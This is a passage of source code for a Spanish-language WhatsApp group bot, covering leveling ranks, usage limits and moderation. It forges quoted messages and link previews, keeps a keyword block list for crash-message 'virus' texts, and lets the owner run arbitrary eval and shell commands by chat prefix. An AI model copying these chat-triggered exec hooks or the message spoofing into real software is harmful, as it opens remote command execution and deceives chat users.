			cnf.sendMessage(from, pesan , tipe , {quoted: { key: { fromMe: false, participant: `${target}`, ...(from ? { remoteJid: from } : {}) }, message: {"imageMessage":{url: 'https://mmg.whatsapp.net/d/f/Ahj0ACnTjSHHm6-HjqAUBYiCu2-85zMZp_-EhiXlsd6A.enc',mimetype: 'image/jpeg',caption: `${caption}`,fileSha256: '0Pk0qJyQFn9FCtslZrydJHRQDKryjYcdP7I3CmRrHRs=',fileLength: '20696',height: 360,width: 382,mediaKey: 'N43d/3GY7GYQpgBymb9qFY5O9iNDXuBirXsNZk+X61I=',fileEncSha256: 'IdFM58vy8URV+IUmOqAY3OZsvCN6Px8gaJlRCElqhd4=',directPath: '/v/t62.7118-24/35174026_475909656741093_8174708112574209693_n.enc?oh=2a690b130cf8f912a9ca35f366558743&oe=6061F0C6',mediaKeyTimestamp: '1614240917',jpegThumbnail: '/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEMASAMBIgACEQEDEQH/xAAwAAADAAMBAAAAAAAAAAAAAAAABAUBAwYCAQADAQEAAAAAAAAAAAAAAAABAgMABP/aAAwDAQACEAMQAAAAoy6kcWS2eH8miq17B553Thh1BgyTY9iULYfndGBmbSwNEV3eWXpjwZElG09WJckXCj8sWBVc1ZKXj2ZYaoWHnc67K3PbKwtZOqzLrzdQAg5fWFRUeCNTQG2pEKJ0wCD/xAAoEAACAgIBAQkAAwEAAAAAAAABAgADBBEScQUQEyEiMTJBYSNRYmP/2gAIAQEAAT8AaZzfEdwWcGMTE1jNv3M1ozDb+SD2jTO+Yigk6A3KqhseIdfkroTYbXQRrkVuJOplKEuOpjtpxF+IjTO+YnZoBvj4pa/msHtMnHZrgymZ6hCnSJsDl+ys7rTpGmevxMwLFS/1fcA7iNzPsDXaH1NccYH+2lJ1SnSNMlOdcbY6iYGa9g4OJzXW9zI7SBJrpjqxsA9zMkcMetf2V7NKD/McgAkxsis7EcA2fkxkqSkaYbMGRu3hr0x6q6ckufaUMpsexj0ma4Y0qDKhqlektyntXiQO4qWI0PONVZWNsNTmZwewekEwo1fpYaMZdvWf2DYrXoO/ARWLNL6VuXiYcSsuK9eXGYtHhM/nsTPVQgb7iDkydRCNBYYx1Ozj6nmSStRIgJ8UH/nMJiTZs/c7RPwExhu+vrH+p//EAB4RAAIBBAMBAAAAAAAAAAAAAAABAhAREjIhMDFC/9oACAECAQE/AOpJsxEqIj4TfNqXygIWpLc+ZEdBH//EAB4RAAICAgIDAAAAAAAAAAAAAAABAjEQETJBAxJx/9oACAEDAQE/AHWVeHQtYrDaNkno7GOzxP10xzWipDHZHidx+EuQz//Z',scansSidecar: 'choizTOCOFXo21QcOR/IlCehTFztHGnB3xo4F4d/kwmxSJJIbMmvxg==',scanLengths: [Array],midQualityFileSha256: '68OHK4IyhiKDNgNAZ3SoXsngzYENebQkV4b/RwhhYIY=',midQualityFileEncSha256: '2EYOLCXx+aqg9RyP6xJYChQNbEjXZmc0EcSwHzoyXx0='}}}})
			}
		const simir = (teks) => {
			cnf.sendMessage(from, teks, text, { quoted:ftrol })
		}
		const math = (teks) => {
				return Math.floor(teks)
		}
		const sendMess = (hehe, teks) => {
			cnf.sendMessage(hehe, teks, text, { quoted: ftok, contextInfo: { forwardingScore: 508, isForwarded: true}})
		}
		const mentions = (teks, memberr, id) => {
			(id == null || id == undefined || id == false) ? cnf.sendMessage(from, teks.trim(), extendedText, { contextInfo: { "mentionedJid": memberr } }) : cnf.sendMessage(from, teks.trim(), extendedText, { quoted: mek, contextInfo: { "mentionedJid": memberr } })
		}
		const sendFileFromUrl = async(link, type, options) => {
hasil = await getBuffer(link)
cnf.sendMessage(from, hasil, type, options).catch(e => {
fetch(link).then((hasil) => {
cnf.sendMessage(from, hasil, type, options).catch(e => {
cnf.sendMessage(from, { url : link }, type, options).catch(e => {
reply
console.log(e)
})
})
})
})
}
  const sendMediaURL = async(to, url, text="", mids=[]) =>{
				if(mids.length > 0){
					text = normalizeMention(to, text, mids)
				}
				const fn = Date.now() / 10000;
				const filename = fn.toString()
				let mime = ""
				var download = function (uri, filename, callback) {
					request.head(uri, function (err, res, body) {
						mime = res.headers['content-type']
						request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
					});
				};
				download(url, filename, async function () {
					console.log('done');
					let media = fs.readFileSync(filename)
					let type = mime.split("/")[0]+"Message"
					if(mime === "image/gif"){
						type = MessageType.video
						mime = Mimetype.gif
					}
					if(mime.split("/")[0] === "audio"){
						mime = Mimetype.mp4Audio
					}
					cnf.sendMessage(to, media, type, { quoted: mek, mimetype: mime, caption: text,contextInfo: {"mentionedJid": mids}})
					
					fs.unlinkSync(filename)
				});
			}
		   const sendFakeThumb = async function(from, url, title, desc){
				var anoim = {
					detectLinks: false
				}
				var qul = await cnf.generateLinkPreview(url)
				qul.title = title
				qul.description = desc
				qul.jpegThumbnail = dfrply
				cnf.sendMessage(from, qul, MessageType.extendedText, anoim)
			}
			function Json(objectPromise) {
var objectString = JSON.stringify(objectPromise, null, 2)
var parse = util.format(objectString)
if (objectString == undefined) {
parse = util.format(objectPromise)
}
return reply(parse)
}
            function speedText(speed) {
                let bits = speed * 8;
                const units = ['', 'K', 'M', 'G', 'T'];
                const places = [0, 1, 2, 3];
                let unit = 0;
                while (bits >= 2000 && unit < 4) {
                    unit++;
                    bits/= 1000;
                }
                return `${bits.toFixed(places[unit])} ${units[unit]}bps`;
            }
            
            
            
  // [ LEVELING, LIMIT, DINERO ] \\          
            
   	           if (isRegistered ) {
 	           const checkATM = checkATMuser(sender)	     
	        }
			/*[-- funcion barra de nivel --]*/
			var per = '*[▒▒▒▒▒▒▒▒▒▒] 0%*'
			const peri = 50 * (Math.pow(2, getLevelingLevel(sender)) - 1)
			const perl = peri-getLevelingXp(sender) 
			const resl = Math.round(100-((perl/getLevelingXp(sender))*100))
			if (resl <= 10) {
				per = `*[█▒▒▒▒▒▒▒▒▒] ${resl}%*`
			} else if (resl <= 20) {
				per = `*[██▒▒▒▒▒▒▒▒] ${resl}%*`
			} else if (resl <= 30) {
				per = `*[███▒▒▒▒▒▒▒] ${resl}%*`
			} else if (resl <= 40) {
				per = `*[████▒▒▒▒▒▒] ${resl}%*`
			} else if (resl <= 50) {
				per = `*[█████▒▒▒▒▒] ${resl}%*`
			} else if (resl <= 60) {
				per = `*[██████▒▒▒▒] ${resl}%*`
			} else if (resl <= 70) {
				per = `*[███████▒▒▒] ${resl}%*`
			} else if (resl <= 80) {
				per = `*[████████▒▒] ${resl}%*`
			} else if (resl <= 90) {
				per = `*[█████████▒] ${resl}%*`
			} else if (resl <= 100) {
				per = `*[██████████] ${resl}%*`
			} 
				
			
			/*[-- funcion ranking --]*/
			const levelRole = getLevelingLevel(sender)
   	       var role = 'Dicipulo'
        if (levelRole <= 2) {
            role = 'Dicipulo'
        } else if (levelRole <= 4) {
            role = 'Dicipulo Dia 1 ⚊¹'
        } else if (levelRole <= 6) {
            role = 'Dicipulo Dia 2 ⚊²'
        } else if (levelRole <= 8) {
            role = 'Dicipulo Dia 3 ⚊³'
        } else if (levelRole <= 10) {
            role = 'Dicipulo Dia 4 ⚊⁴'
        } else if (levelRole <= 12) {
            role = 'Avanzado mes 1 ⚌¹'
        } else if (levelRole <= 14) {
            role = 'Avanzado mes 2 ⚌²'
        } else if (levelRole <= 16) {
            role = 'Avanzado mes 3 ⚌³'
        } else if (levelRole <= 18) {
            role = 'Avanzado mes 4 ⚌⁴'
        } else if (levelRole <= 20) {
            role = 'Avanzado mes 5 ⚌⁵'
        } else if (levelRole <= 22) {
            role = 'Aventurero nv dia 1 ☰¹'
        } else if (levelRole <= 24) {
            role = 'Aventurero nv dia 2 ☰²'
        } else if (levelRole <= 26) {
            role = 'Aventurero nv dia 3 ☰³'
        } else if (levelRole <= 28) {
            role = 'Aventurero nv dia 4 ☰⁴'
        } else if (levelRole <= 30) {
            role = 'Aventurero nv dia 5 ☰⁵'
        } else if (levelRole <= 32) {
            role = 'Aventurero exp año 1 ≣¹'
        } else if (levelRole <= 34) {
            role = 'Aventurero exp año 2 ≣²'
        } else if (levelRole <= 36) {
            role = 'Aventurero exp año 3 ≣³'
        } else if (levelRole <= 38) {
            role = 'Aventurero exp año 4 ≣⁴'
        } else if (levelRole <= 40) {
            role = 'Aventurero exp año 5 ≣⁵'
        } else if (levelRole <= 42) {
            role = 'Aventurero prf año 1 ﹀¹'
        } else if (levelRole <= 44) {
            role = 'Aventurero prf año 2 ﹀²'
        } else if (levelRole <= 46) {
            role = 'Aventurero prf año 3 ﹀³'
        } else if (levelRole <= 48) {
            role = 'Aventurero prf año 4 ﹀⁴'
        } else if (levelRole <= 50) {
            role = 'Aventurero prf año 5 ﹀⁵'
        } else if (levelRole <= 52) {
            role = 'Maestro mes 1 ︾¹'
        } else if (levelRole <= 54) {
            role = 'Maestro mes 2 ︾²'
        } else if (levelRole <= 56) {
            role = 'Maestro mes 3 ︾³'
        } else if (levelRole <= 58) {
            role = 'Maestro mes 4 ︾⁴'
        } else if (levelRole <= 60) {
            role = 'Maestro mes 5 ︾⁵'
        } else if (levelRole <= 62) {
            role = 'Elite mes 1 ♢¹ '
        } else if (levelRole <= 64) {
            role = 'Elite mes 2 ♢²'
        } else if (levelRole <= 66) {
            role = 'Elite mes 3 ♢³'
        } else if (levelRole <= 68) {
            role = 'Elite mes 4 ♢⁴'
        } else if (levelRole <= 70) {
            role = 'Elite mes 5 ♢⁵'
        } else if (levelRole <= 72) {
            role = 'Elite año 1 ♢♢¹'
        } else if (levelRole <= 74) {
            role = 'Elite año 2 ♢♢²'
        } else if (levelRole <= 76) {
            role = 'Elite año 3 ♢♢³'
        } else if (levelRole <= 78) {
            role = 'Elite año 4 ♢♢⁴'
        } else if (levelRole <= 80) {
            role = 'Elite año 5 ♢♢⁵'
        } else if (levelRole <= 82) {
            role = 'Elite de la elite dia 1 ✷¹'
        } else if (levelRole <= 84) {
            role = 'Elite de la elite dia 2 ✷²'
        } else if (levelRole <= 86) {
            role = 'Elite de la elite dia 3 ✷³'
        } else if (levelRole <= 88) {
            role = 'Elite de la elite dia 4 ✷⁴'
        } else if (levelRole <= 90) {
            role = 'Elite de la elite dia 5 ✷⁵'
        } else if (levelRole <= 92) {
            role = 'Escolta dia 1 ✷✷¹'
        } else if (levelRole <= 94) {
            role = 'Escolta dia 2 ✷✷²'
        } else if (levelRole <= 96) {
            role = 'Escolta dia 3 ✷✷³'
        } else if (levelRole <= 98) {
            role = 'Escolta dia 4 ✷✷⁴'
        } else if (levelRole <= 100) {
            role = 'Escolta dia 5 ✷✷⁵'
        } else if (levelRole <= 102) {                   
            role = 'Leyenda I 忍'
        } else if (levelRole <= 154) {
            role = 'Leyenda I 忍'
        } else if (levelRole <= 156) {
            role = 'Leyenda I 忍'
        } else if (levelRole <= 158) {
            role = 'Leyenda I 忍'
        } else if (levelRole <= 160) {
            role = 'Leyenda I 忍'
        } else if (levelRole <= 162) {
            role = 'Leyenda I 忍'
        } else if (levelRole <= 164) {
            role = 'Leyenda I 忍'
        } else if (levelRole <= 166) {
            role = 'Leyenda II 忍'
        } else if (levelRole <= 168) {
            role = 'Leyenda II 忍'
        } else if (levelRole <= 170) {
            role = 'Leyenda II 忍'
        } else if (levelRole <= 172) {
            role = 'Leyenda II 忍'
        } else if (levelRole <= 174) {
            role = 'Leyenda II 忍'
        } else if (levelRole <= 176) {
            role = 'Leyenda II 忍'
        } else if (levelRole <= 178) {
            role = 'Leyenda II 忍'
        } else if (levelRole <= 180) {
            role = 'Leyenda II 忍'
        } else if (levelRole <= 182) {
            role = 'Leyenda II 忍'
        } else if (levelRole <= 184) {
            role = 'Leyenda II 忍'
        } else if (levelRole <= 186) {
            role = 'Leyenda II 忍'
        } else if (levelRole <= 188) {
            role = 'Leyenda II 忍'
        } else if (levelRole <= 190) {
            role = 'Leyenda II 忍'
        } else if (levelRole <= 192) {
            role = 'Leyenda I 忍'
        } else if (levelRole <= 194) {
            role = 'Leyenda II 忍'
        } else if (levelRole <= 196) {
            role = 'Leyenda II 忍'
        } else if (levelRole <= 198) {
            role = 'Leyenda II 忍'
        } else if (levelRole <= 200) {
            role = 'Leyenda III 忍'
        } else if (levelRole <= 210) {
            role = 'Leyenda III 忍'
        } else if (levelRole <= 220) {
            role = 'Leyenda III 忍'
        } else if (levelRole <= 230) {
            role = 'Leyenda III 忍'
        } else if (levelRole <= 240) {
            role = 'Leyenda III 忍'
        } else if (levelRole <= 250) {
            role = 'Leyenda III 忍'
        } else if (levelRole <= 260) {
            role = 'Leyenda III 忍'
        } else if (levelRole <= 270) {
            role = 'Leyenda III 忍'
        } else if (levelRole <= 280) {
            role = 'Leyenda III 忍'
        } else if (levelRole <= 290) {
            role = 'Leyenda III 忍'
        } else if (levelRole <= 300) {
            role = 'Leyenda IV 忍'
        } else if (levelRole <= 310) {
            role = 'Leyenda IV 忍'
        } else if (levelRole <= 320) {
            role = 'Leyenda IV 忍'
        } else if (levelRole <= 330) {
            role = 'Leyenda IV 忍'
        } else if (levelRole <= 340) {
            role = 'Leyenda IV 忍'
        } else if (levelRole <= 350) {
            role = 'Leyenda IV 忍'
        } else if (levelRole <= 360) {
            role = 'Leyenda IV 忍'
        } else if (levelRole <= 370) {
            role = 'Leyenda IV 忍'
        } else if (levelRole <= 380) {
            role = 'Leyenda IV 忍'
        } else if (levelRole <= 390) {
            role = 'Leyenda IV 忍'
        } else if (levelRole <= 400) {
            role = 'Leyenda V 忍'
        } else if (levelRole <= 410) {
            role = 'Leyenda V 忍'
        } else if (levelRole <= 420) {
            role = 'Leyenda V 忍'
        } else if (levelRole <= 430) {
            role = 'Leyenda V 忍'
        } else if (levelRole <= 440) {
            role = 'Leyenda V 忍'
        } else if (levelRole <= 450) {
            role = 'Leyenda V 忍'
        } else if (levelRole <= 460) {
            role = 'Leyenda V 忍'
        } else if (levelRole <= 470) {
            role = 'Leyenda V 忍'
        } else if (levelRole <= 480) {
            role = 'Leyenda V 忍'
        } else if (levelRole <= 490) {
            role = 'Leyenda V 忍'
        } else if (levelRole <= 500) {
            role = 'Leyenda VI 忍'
        } else if (levelRole <= 666) {
            role = 'Leyenda VII 忍'
        } else if (levelRole <= 700) {
            role = 'Leyenda VIII 忍'
        } else if (levelRole <= 800) {
            role = 'Leyenda IX 忍'
        } else if (levelRole <= 900) {
            role = 'Leyenda X 忍'
        } else if (levelRole <= 1000) {
            role = 'Mythic I 上帝'
        } else if (levelRole <= 2000) {
            role = 'Mythic II 上帝'
        } else if (levelRole <= 3000) {
            role = 'Mythic III 上帝'
        } else if (levelRole <= 4000) {
            role = 'Mythic IV 上帝'
        } else if (levelRole <= 5000) {
            role = 'Mythic V 上帝'
        } else if (levelRole <= 6000) {
            role = 'Mythical Glory 上帝'
        } else if (levelRole <= 7000) {
            role = 'Mythical Glory x1000帝'
        } else if (levelRole <= 8000) {
            role = 'Mythical Glory 1100 上帝'
        } else if (levelRole <= 9000) {
            role = 'Mythical Glory 2000 上帝'
        } else if (levelRole <= 10000) {
            role = 'Despertar 特尔邦贡'
	    } else if (levelRole <= 66666666) {
   	         role = 'Onichan❗'
   	     }
   		 
				
				
	        /*[-- funcion nivel --]*/
            if (isGroup && isRegistered && isLevelingOn) {
            const currentLevel = getLevelingLevel(sender)
            const checkId = getLevelingId(sender)
            try {
                if (currentLevel === undefined && checkId === undefined) addLevelingId(sender)
                const amountXp = Math.floor(Math.random() * 10) + 250
                const requiredXp = 500 * (Math.pow(2, currentLevel) - 1)
                const getLevel = getLevelingLevel(sender)
                addLevelingXp(sender, amountXp)
                if (requiredXp <= getLevelingXp(sender)) {
                    addLevelingLevel(sender, 1)
                    bayarLimit(sender, 3)
                     addKoinUser(sender, 20)     	           	                
                     await reply(ind.levelup(pushname, sender, getLevelingXp,  getLevel, getLevelingLevel, role))            
	               
 
                  }
            } catch (err) {
                console.error(err)
            }
        }
         

          /*[-- function check limit --]*/
          const checkLimit = (sender) => {
          	let found = false
                    for (let lmt of _limit) {
                        if (lmt.id === sender) {
                            let limitCounts = limitawal - lmt.limit
                            if (limitCounts <= 0) return cnf.sendMessage(from,`Su límite de solicitudes ha expirado`, text,{ quoted: mek})
                            cnf.sendMessage(from, ind.limitcount(limitCounts), text, { quoted : mek})
                            found = true
                        }
                    }
                    if (found === false) {
                        let obj = { id: sender, limit: 0 }
                        _limit.push(obj)
                        fs.writeFileSync('./database/user/limit.json', JSON.stringify(_limit))
                        cnf.sendMessage(from, ind.limitcount(limitCounts), text, { quoted : mek})
                    }
				} 
		
			/*[-- limit end --]*/
            const isLimit = (sender) =>{ 
          	if (isOwner ) {return false;}
		      let position = false
              for (let i of _limit) {
              if (i.id === sender) {
              	let limits = i.limit
              if (limits >= limitawal ) {
              	  position = true
                    cnf.sendMessage(from, ind.limitend(pushname), text, {quoted: mek})
                    return true
              } else {
              	_limit
                  position = true
                  return false
               }
             }
           }
           if (position === false) {
           	const obj = { id: sender, limit: 0 }
                _limit.push(obj)
                fs.writeFileSync('./database/user/limit.json',JSON.stringify(_limit))
           return false
     	  }
     	}

//[][][]\\          
            
            
            
			// AUTO

			// MUTE
        if (isMuted){
            if (!isGroupAdmins && !isOwner && !mek.key.fromMe) return
            if (budy.toLowerCase().startsWith(`${prefix}unmute`)){
                let anu = mute.indexOf(from)
                mute.splice(anu, 1)
                fs.writeFileSync('./database/mute.json', JSON.stringify(mute))
                reply('Se ha muteado al bot en este grupo.')
            }
        }
        if (budy.includes("https://chat.whatsapp.com/")) {
        	if (!mek.key.fromMe){
				if (!isGroup) return
				if (!isAntiLink) return
				if (isGroupAdmins) return reply('Eres admin asi que no te eliminare :v')
				cnf.updatePresence(from, Presence.composing)
				var kic = `${sender.split("@")[0]}@s.whatsapp.net`
				reply('Enlace detectado!')
			    cnf.groupRemove(from, [kic]).catch((e) => { reply(mess.only.Badmin) })
			}
			}
			if (budy.includes("https://t.me/")) {
        	if (!mek.key.fromMe){
				if (!isGroup) return
				if (!isAntiLink) return
				if (isGroupAdmins) return reply('Eres admin asi que no te eliminare :v')
				cnf.updatePresence(from, Presence.composing)
				var kic = `${sender.split("@")[0]}@s.whatsapp.net`
				reply('Enlace detectado!')
			    cnf.groupRemove(from, [kic]).catch((e) => { reply(mess.only.Badmin) })
			}
			}
			if (budy.includes("KBz6KgNL2Z4")) {
        	if (!mek.key.fromMe){
				if (!isGroup) return
				if (!isAntiLink) return
				if (isGroupAdmins) return reply('Eres admin asi que no te eliminare :v')
				cnf.updatePresence(from, Presence.composing)
				var kic = `${sender.split("@")[0]}@s.whatsapp.net`
				reply('Enlace detectado!')
			    cnf.groupRemove(from, [kic]).catch((e) => { reply(mess.only.Badmin) })
			}
			}
			if (budy.includes("q80epcjlv4qy0g3")) {
        	if (!mek.key.fromMe){
				if (!isGroup) return
				if (!isAntiLink) return
				if (isGroupAdmins) return reply('Eres admin asi que no te eliminare :v')
				cnf.updatePresence(from, Presence.composing)
				var kic = `${sender.split("@")[0]}@s.whatsapp.net`
				reply('Enlace detectado!')
			    cnf.groupRemove(from, [kic]).catch((e) => { reply(mess.only.Badmin) })
			}
			}
			if (budy.includes("rzago2xxlebx2sp")) {
        	if (!mek.key.fromMe){
				if (!isGroup) return
				if (!isAntiLink) return
				if (isGroupAdmins) return reply('Eres admin asi que no te eliminare :v')
				cnf.updatePresence(from, Presence.composing)
				var kic = `${sender.split("@")[0]}@s.whatsapp.net`
				reply('Enlace detectado!')
			    cnf.groupRemove(from, [kic]).catch((e) => { reply(mess.only.Badmin) })
			}
			}
			// Antitravas
			if (budy.includes("𒇫")) {
        	if (!mek.key.fromMe){
				if (!isGroup) return
				if (!isAntiLink) return
				if (isGroupAdmins) return reply('Eres admin asi que no te eliminare :v')
				cnf.updatePresence(from, Presence.composing)
				var kic = `${sender.split("@")[0]}@s.whatsapp.net`
				reply('Virus detectado!')
			    cnf.groupRemove(from, [kic]).catch((e) => { reply(mess.only.Badmin) })
			}
			}
			if (budy.includes("https://www.instagram.com/")) {
        	if (!mek.key.fromMe){
				if (!isGroup) return
				if (!isAntiLink) return
				if (isGroupAdmins) return reply('Eres admin asi que no te eliminare :v')
				cnf.updatePresence(from, Presence.composing)
				var kic = `${sender.split("@")[0]}@s.whatsapp.net`
				reply('Enlace detectado!')
			    cnf.groupRemove(from, [kic]).catch((e) => { reply(mess.only.Badmin) })
			}
			}
			if (budy.includes("🛒𝐁𝐔𝐆 𝐓𝐑𝐎𝐋𝐈🎈")) {
        	if (!mek.key.fromMe){
				if (!isGroup) return
				if (!isAntiLink) return
				if (isGroupAdmins) return reply('Eres admin asi que no te eliminare :v')
				cnf.updatePresence(from, Presence.composing)
				var kic = `${sender.split("@")[0]}@s.whatsapp.net`
				reply('Virus detectado!')
			    cnf.groupRemove(from, [kic]).catch((e) => { reply(mess.only.Badmin) })
			}
			}
			if (budy.includes("☠༒匚卄ㄖㄥㄖ༒☠")) {
        	if (!mek.key.fromMe){
				if (!isGroup) return
				if (!isAntiLink) return
				if (isGroupAdmins) return reply('Eres admin asi que no te eliminare :v')
				cnf.updatePresence(from, Presence.composing)
				var kic = `${sender.split("@")[0]}@s.whatsapp.net`
				reply('Virus detectado!')
			    cnf.groupRemove(from, [kic]).catch((e) => { reply(mess.only.Badmin) })
			}
			}
			if (budy.includes("👾 𝐏𝐇Ø𝐄ŇĪX ŤŘÅVA VĪŘJÃØ࿗ 👾")) {
        	if (!mek.key.fromMe){
				if (!isGroup) return
				if (!isAntiLink) return
				if (isGroupAdmins) return reply('Eres admin asi que no te eliminare :v')
				cnf.updatePresence(from, Presence.composing)
				var kic = `${sender.split("@")[0]}@s.whatsapp.net`
				reply('Virus detectado!')
			    cnf.groupRemove(from, [kic]).catch((e) => { reply(mess.only.Badmin) })
			}
			}
			if (budy.includes("𝐃𝐀𝐕𝐈𝐙𝐈𝐍𝐌𝐀𝐊𝐄𝐑")) {
        	if (!mek.key.fromMe){
				if (!isGroup) return
				if (!isAntiLink) return
				if (isGroupAdmins) return reply('Eres admin asi que no te eliminare :v')
				cnf.updatePresence(from, Presence.composing)
				var kic = `${sender.split("@")[0]}@s.whatsapp.net`
				reply('Virus detectado!')
			    cnf.groupRemove(from, [kic]).catch((e) => { reply(mess.only.Badmin) })
			}
			}
			if (budy.includes("🅢🅛🅨🅔🅡-07")) {
        	if (!mek.key.fromMe){
				if (!isGroup) return
				if (!isAntiLink) return
				if (isGroupAdmins) return reply('Eres admin asi que no te eliminare :v')
				cnf.updatePresence(from, Presence.composing)
				var kic = `${sender.split("@")[0]}@s.whatsapp.net`
				reply('Virus detectado!')
			    cnf.groupRemove(from, [kic]).catch((e) => { reply(mess.only.Badmin) })
			}
			}
			if (budy.includes("ÐØㄈŤØ尺")) {
        	if (!mek.key.fromMe){
				if (!isGroup) return
				if (!isAntiLink) return
				if (isGroupAdmins) return reply('Eres admin asi que no te eliminare :v')
				cnf.updatePresence(from, Presence.composing)
				var kic = `${sender.split("@")[0]}@s.whatsapp.net`
				reply('Virus detectado!')
			    cnf.groupRemove(from, [kic]).catch((e) => { reply(mess.only.Badmin) })
			}
			}
			if (budy.includes("Mosca_Virus")) {
        	if (!mek.key.fromMe){
				if (!isGroup) return
				if (!isAntiLink) return
				if (isGroupAdmins) return reply('Eres admin asi que no te eliminare :v')
				cnf.updatePresence(from, Presence.composing)
				var kic = `${sender.split("@")[0]}@s.whatsapp.net`
				reply('Virus detectado!')
			    cnf.groupRemove(from, [kic]).catch((e) => { reply(mess.only.Badmin) })
			}
			}
			if (budy.includes("𒈪")) {
        	if (!mek.key.fromMe){
				if (!isGroup) return
				if (!isAntiLink) return
				if (isGroupAdmins) return reply('Eres admin asi que no te eliminare :v')
				cnf.updatePresence(from, Presence.composing)
				var kic = `${sender.split("@")[0]}@s.whatsapp.net`
				reply('Virus detectado!')
			    cnf.groupRemove(from, [kic]).catch((e) => { reply(mess.only.Badmin) })
			}
			}
			if (budy.includes("cambio")) {
        	if (!mek.key.fromMe){
				if (!isGroup) return
				if (!isAntiLink) return
				if (isGroupAdmins) return reply('Eres admin asi que no te eliminare :v')
				cnf.updatePresence(from, Presence.composing)
				var kic = `${sender.split("@")[0]}@s.whatsapp.net`
				reply('Virus detectado!')
			    cnf.groupRemove(from, [kic]).catch((e) => { reply(mess.only.Badmin) })
			}
			}
			if (budy.includes("🙄")) {
        	if (!mek.key.fromMe){
				if (!isGroup) return
				if (!isAntiLink) return
				if (isGroupAdmins) return reply('Eres admin asi que no te eliminare :v')
				cnf.updatePresence(from, Presence.composing)
				var kic = `${sender.split("@")[0]}@s.whatsapp.net`
				reply('Emoji detectado!')
			    cnf.groupRemove(from, [kic]).catch((e) => { reply(mess.only.Badmin) })
			}
			}
			
			if (budy.includes("🖕")) {
        	if (!mek.key.fromMe){
				if (!isGroup) return
				if (!isAntiLink) return
				if (isGroupAdmins) return reply('Eres admin asi que no te eliminare :v')
				cnf.updatePresence(from, Presence.composing)
				var kic = `${sender.split("@")[0]}@s.whatsapp.net`
				reply('Emoji detectado!')
			    cnf.groupRemove(from, [kic]).catch((e) => { reply(mess.only.Badmin) })
			}
			}
			
			if (budy.includes("🎭")) {
        	if (!mek.key.fromMe){
				if (!isGroup) return
				if (!isAntiLink) return
				if (isGroupAdmins) return reply('Eres admin asi que no te eliminare :v')
				cnf.updatePresence(from, Presence.composing)
				var kic = `${sender.split("@")[0]}@s.whatsapp.net`
				reply('Emoji detectado!')
			    cnf.groupRemove(from, [kic]).catch((e) => { reply(mess.only.Badmin) })
			}
			}

			if (budy.includes("vendo")) {
        	if (!mek.key.fromMe){
				if (!isGroup) return
				if (!isAntiLink) return
				if (isGroupAdmins) return reply('Eres admin asi que no te eliminare :v')
				cnf.updatePresence(from, Presence.composing)
				var kic = `${sender.split("@")[0]}@s.whatsapp.net`
				reply('Virus detectado!')
			    cnf.groupRemove(from, [kic]).catch((e) => { reply(mess.only.Badmin) })
			}
			}

			
			
			
			
			if (bad.includes(messagesD)) {
				reply('_No seas Toxico!_')
				}
				if (m.message && !m.key.fromMe && m.isBaileys && m.quoted && m.quoted.mtype === 'orderMessage' && !(m.quoted.token && m.quoted.orderId)) {
m.reply('Troli Detectado\n\n' + require('util').format(m.key))
await cnf.modifyChat(m.chat, 'delete', {
 includeStarred: false
})
}                     
                      
           if (budy.startsWith('~>')){
if (!isOwner)return reply(`Este comando no puede ser ejecutado por ti`)
console.log(color('[EVAL]'), color(moment(mek.messageTimestamp * 1000).format('DD/MM/YY HH:mm:ss'), 'yellow'), color(`Eval v2`))
ras = budy.slice(2)
function _(rem) {
ren = JSON.stringify(rem,null,2)
pes = util.format(ren)
reply(pes)
}
try{c
reply(require('util').format(eval(`(async () => { ${ras} })()`)))
} catch(err) {
e = String(err)
reply(e)
}
}
if (budy.startsWith('∆')){
if (!mek.key.fromMe && !isOwner) return
qur = budy.slice(2)
exec(qur, (err, stdout) => {
if (err) return reply(`${err}`)
if (stdout) {
reply(stdout)
}
})
}
if (budy.startsWith('^')){
if (!mek.key.fromMe && !isOwner) return
try {
return pemuda.sendMessage(from, JSON.stringify(eval(budy.slice(2)),null,'\t'),text, {quoted: mek})
} catch(err) {
e = String(err)
reply(e)
}
}
if (budy.startsWith('=>')){
if (!isOwner && !mek.key.fromMe) return
var konsol = budy.slice(3)
Return = (sul) => {
var sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if (sat == undefined){
bang = util.format(sul)
}
return reply(bang)
}
try {
reply(util.format(eval(`;(async () => { ${konsol} })()`)))
console.log('\x1b[1;37m>', '[', '\x1b[1;32mEXEC\x1b[1;37m', ']', time, color(">", "green"), 'from', color(sender.split('@')[0]), 'args :', color(args.length))
} catch(e){
reply(String(e))
}
}                      
                      
if (!settings.autoread) {
cnf.chatRead(from)
}
if (!settings.autocomposing) {
cnf.updatePresence(from, Presence.composing)
}
if (!settings.autorecording) {
cnf.updatePresence(from, Presence.recording)
}
   const sotoy = [
        '🍊 : 🍒 : 🍐',
        '🍒 : 🔔 : 🍊',
        '🍇 : 🍇 : 🍐',
        '🍊 : 🍋 : 🔔',
        '🔔 : 🍒 : 🍐',
        '🔔 : 🍒 : 🍊',
        '🍊 : 🍋 : 🔔',        
        '🍐 : 🍒 : 🍋',
        '🍐 : 🍒 : 🍐',
        '🍊 : 🍒 : 🍒',
        '🔔 : 🔔 : 🍇',
        '🍌 : 🍌 : 🔔',
        '🍐 : 🔔 : 🔔',
        '🍊 : 🍋 : 🍒',
        '🍋 : 🍋 : 🍋 Ganador👑',
        '🔔 : 🔔 : 🍇',
        '🔔 : 🍇 : 🍇', 
        '🔔 : 🍐 : 🔔',
        '🍌 : 🍌 : 🍌 Ganador👑'
        ]

        const isStcMedia = isStc !== "" && content.includes("quotedMessage") && !content.includes("extendedTextMessage") || isStc !== "" && content.includes("quotedMessage") && !content.includes("conversation")
	    const isStcVideo = isStcMedia && content.includes("videoMessage")
	    const isStcImage = isStcMedia && content.includes("imageMessage")
	    const isStcSticker = isStcMedia && content.includes("stickerMessage")
        const isStcTeks = isStcMedia && content.includes("quotedMessage")
        const isStcDocs = isStcMedia && content.includes("documentMessage")
        const isStcContact = isStcMedia && content.includes("contactMessage")
        const isStcAudio = isStcMedia && content.includes("audioMessage")
        const isStcLoca = isStcMedia && content.includes("locationMessage")
        const isStcTag = isStcMedia && content.includes("mentionedJid")
        const isStcReply = isStcMedia && content.includes("Message")
        const isStcProd = isStcMedia && content.includes("productMessage")
       
